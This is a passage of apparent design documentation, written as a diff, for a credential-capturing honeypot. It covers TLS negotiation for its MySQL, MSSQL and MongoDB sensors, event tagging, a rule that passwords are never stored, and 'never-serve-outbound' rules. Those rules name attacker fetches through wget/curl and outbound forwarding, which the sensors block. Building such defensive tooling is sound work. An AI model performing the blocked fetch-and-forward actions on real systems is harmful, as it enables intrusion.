+    HandshakeResponse41, which then arrives over TLS and is answered OK with sequence id 3 (greeting
+    0, SSLRequest 1, response 2). A client that ignores the flag is served exactly as before (OK at
+    sequence id 2) (`crates/sensor-cred/src/mysql.rs#is_ssl_request`).
+  - **mssql:** TLS inside TDS, per MS-TDS for TDS 7.x: the PRELOGIN response carries an ENCRYPTION
+    option, the handshake records travel inside TDS PRELOGIN (0x12) packets, and once it completes
+    Login7 and LOGINACK flow as raw TLS records (`crates/sensor-cred/src/tds_tls.rs`). TLS 1.3
+    session tickets are switched off for mssql only, because a ticket written after the handshake
+    would reach a client that has already stopped de-framing. The reply to the client's ENCRYPTION
+    option (`crates/sensor-cred/src/mssql.rs#negotiate_encryption`):
+
+    | Client offers | Reply | Session |
+    |---|---|---|
+    | `ENCRYPT_ON` (0x01) or `ENCRYPT_REQ` (0x03) | `ENCRYPT_ON` | TLS |
+    | `ENCRYPT_OFF` (0x00) | the pre-TLS PRELOGIN response, byte for byte (VERSION only, no ENCRYPTION option) | plaintext |
+    | `ENCRYPT_NOT_SUP` (0x02), or no ENCRYPTION option | `ENCRYPT_NOT_SUP` | plaintext |
+
+    Only the low two bits of the client's value are read (`v & 0x03`); every other bit, the
+    client-certificate bit 0x80 included, is ignored. This is deliberately not the MS-TDS
+    server table: a real server with encryption on answers an `ENCRYPT_OFF` client with
+    `ENCRYPT_REQ` and forces TLS, which would lose the Login7, and so the username, of every
+    scanner that cannot do TLS. The honeypot chooses capture over fidelity, so a client offering
+    `ENCRYPT_OFF` sees exactly what it saw before TLS existed. Login-only encryption (a reply of
+    `ENCRYPT_OFF`) is never offered, since it would need a TLS-to-plaintext switch after Login7.
+    The same capture-first rule covers a client that asked for encryption, was answered
+    `ENCRYPT_ON`, and then sends a plaintext Login7 (packet type 0x10) where the first TLS
+    handshake packet belongs: the first byte after PRELOGIN is read before the TDS-TLS adapter is
+    built, and a 0x10 takes the plaintext Login7 path, so the username is captured in an untagged
+    login event. Any other first byte goes to the adapter, which makes the same framed-or-raw
+    decision it makes for a first read (`crates/sensor-cred/src/tds_tls.rs#TdsTlsAdapter`).
+    Without the pair, the PRELOGIN response carries no ENCRYPTION option, as before
+    (`crates/sensor-cred/src/mssql.rs#prelogin_response_without_tls_is_byte_identical_to_before`).
+  - **mongodb:** on its plaintext port the sensor peeks (never consumes) the first two bytes,
+    bounded by the read timeout. When they are `0x16 0x03` (a TLS handshake record and the record
+    version's major byte) and the pair is set, the connection is served over TLS, the way a mongod
+    in `allowTLS` mode takes both on one port. Anything else, fewer than two bytes before the
+    timeout or end of stream, or no pair, takes the plaintext path. The connection event is
+    written as soon as the sniff decides and before any handshake, tagged `"tls": true` when TLS
+    was chosen, so a client that sends a ClientHello and then aborts, rejects the certificate, or
+    stalls is recorded exactly once, as it would be on a node without TLS
+    (`crates/sensor-cred/src/mongodb.rs#handle_sniffed`). A MongoDB message starts with
+    its little-endian length, so a one-byte check would misroute every plaintext first message
+    whose length is 22, 278, 534 and so on; with two bytes only a 790-byte first message still
+    matches, and longer matching lengths exceed the 64 KiB message cap
+    (`crates/sensor-cred/src/mongodb.rs#TLS_RECORD_PREFIX`). When only `0x16` has arrived the peek
+    is retried every 10 ms (`crates/sensor-cred/src/mongodb.rs#SNIFF_REPEEK`). After a sniff that
+    times out, the plaintext path waits up to another read timeout for the message header, so a
+    silent connection can hold a slot for up to twice the read timeout, still capped by the
+    maximum session duration.
+  - **Event tagging:** events from a TLS session carry `"tls": true`; the key is absent, not
+    false, on plaintext sessions (`crates/sensor-cred/src/lib.rs#with_tls`). For postgresql, mysql
+    and mssql the `honeypot_connection` event is written before negotiation and stays untagged,
+    while the login and postgresql query events of a TLS session are tagged. For mongodb the sniff
+    decides TLS before the connection event is written, so every event of a TLS session is tagged,
+    the connection event included, even when the handshake then fails. An mssql Login7 captured
+    by the plaintext fallback above is untagged.
+  - **Fail-closed:** when either variable is set (a blank value counts as unset) the pair must
+    load, or the sensor exits 1 before binding any protocol; exactly one set, a non-UTF-8 value,
+    an unusable pair and a key that is not mode `0600` all count. Variables are in
+    [environment-variables.md](environment-variables.md); the operator view is
+    [../operations/networking-tls.md](../operations/networking-tls.md#sensor-cred-in-band-tls).
+  - **Validation scope:** the MSSQL TDS-TLS adapter is validated against a rustls client (TLS 1.2
+    and 1.3) framed by hand in the tests and against the MS-TDS text, not against real SQL Server
+    drivers. The owner smoke tests listed in
+    [../operations/networking-tls.md](../operations/networking-tls.md#sensor-cred-in-band-tls)
+    are still to be run.
+
+## Cross-cutting invariants
+
+- **Session id:** `Uuid::now_v7()` minted per accepted TCP connection by the
+  listener, per datagram for catchall UDP and DNS UDP, per transfer for TFTP, and per summary
+  for a DNS or TFTP `rate_limited` event; carried on every event.
+- **Password discipline:** every login-capturing sensor reads the password only to
+  advance the protocol and drops it - never stored, logged, or placed in any event
+  field (SSH `crates/sensor-ssh/src/auth.rs`, telnet `crates/sensor-telnet/src/handler.rs#handle_connection`, FTP `crates/sensor-ftp/src/handler.rs#handle_connection`, redis
+  `crates/sensor-redis/src/handler.rs#Session::handle_auth`, SMTP `crates/sensor-smtp/src/handler.rs#handle_connection`, MQTT `crates/sensor-mqtt/src/handler.rs#parse_connect`, cred handlers). Tests assert absence at
+  the serialized-JSON level.
+- **`authenticated` flag:** `honeypot_connection` and `catchall_probe` are always
+  false; ADB, TFTP and DNS events are always false (no auth step); `honeypot_login_attempt` is
+  true; `honeypot_command_exec` reflects session auth state (redis/http false,
+  ssh/telnet true post-login).
+- **Never-serve-outbound:** FTP RETR→550, FTP PORT/EPRT→502, ADB sync RECV→FAIL,
+  SSH `direct-tcpip` refused, catchall/UDP never responds, TFTP RRQ gets one tiny
+  error and never any file content, an MQTT PUBLISH is recorded but never delivered,
+  retained or forwarded, a DNS query gets REFUSED and no record, shell `wget`/`curl`
+  canned - no sensor fetches or serves attacker-directed content.
+
+## Notes
+
+- `SensorConfig` in `sensor-framework/src/config.rs` is the framework's aggregate
+  config type but is **not** used by the individual sensor binaries; each sensor
+  defines its own `Config` struct. It appears to be dead or reference-only surface
+  `[inferred]`.
+- The SSH version-exchange wire string (`SSH-2.0-<banner>`) is `[inferred]` from
+  the banner default and handshake usage; the exact formatting function body was
+  not read line-by-line.
